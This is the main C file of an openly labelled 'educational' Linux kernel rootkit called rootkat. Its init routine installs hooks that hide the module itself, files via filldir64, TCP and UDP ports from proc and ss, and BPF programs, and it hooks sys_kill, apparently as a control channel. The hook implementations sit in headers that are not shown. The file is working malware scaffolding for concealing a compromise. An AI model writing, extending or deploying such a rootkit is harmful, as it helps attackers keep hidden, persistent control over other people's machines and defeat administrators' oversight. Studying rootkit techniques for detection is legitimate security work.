// SPDX-License-Identifier: MIT
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "kallsyms.h"
#include "resolver.h"
#include "hook_m_show.h"
#include "hook_sys_kill.h"
#include "hook_filldir64.h"
#include "hook_tcp4_seq_show.h"
#include "hook_tcp6_seq_show.h"
#include "hook_udp_seq_show.h"
#include "hook_inet_sk_diag_fill.h"
#include "hook_sys_bpf.h"

#define ROOTKAT_TAG "rootkat: "

static int __init rootkat_init(void)
{
	int rc;

	pr_info(ROOTKAT_TAG "loading\n");

	rc = rootkat_kallsyms_init();
	if (rc) {
		pr_err(ROOTKAT_TAG "kallsyms init failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_m_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "self-hide hook failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_sys_kill_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "sys_kill hook failed: %d\n", rc);
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_filldir64_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "filldir64 hook failed: %d\n", rc);
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp4_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp4_seq_show hook failed: %d\n", rc);
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp6_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp6_seq_show hook failed: %d\n", rc);
		rootkat_hook_tcp4_seq_show_remove();
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	/* UDP port hiding — non-fatal, mirrors TCP. */
	rc = rootkat_hook_udp4_seq_show_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
	rc = rootkat_hook_udp6_seq_show_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);

	/* Non-fatal: this hook depends on a symbol that may be inlined or
	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
	 * stays open, but every other hook still works. Log + continue. */
	rc = rootkat_hook_inet_sk_diag_fill_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
		        rc);

	/* Non-fatal: BPF prog self-hide. */
	rc = rootkat_hook_sys_bpf_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
		        rc);

	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
	return 0;
}

static void __exit rootkat_exit(void)
{
	rootkat_hook_sys_bpf_remove();
	rootkat_hook_inet_sk_diag_fill_remove();
	rootkat_hook_udp6_seq_show_remove();
	rootkat_hook_udp4_seq_show_remove();
	rootkat_hook_tcp6_seq_show_remove();
	rootkat_hook_tcp4_seq_show_remove();
	rootkat_hook_filldir64_remove();
	rootkat_hook_sys_kill_remove();
	rootkat_hook_m_show_remove();
	pr_info(ROOTKAT_TAG "unloaded\n");
}

module_init(rootkat_init);
module_exit(rootkat_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkat");
MODULE_DESCRIPTION("Educational LKM rootkit skeleton");
MODULE_VERSION("0.0.1");
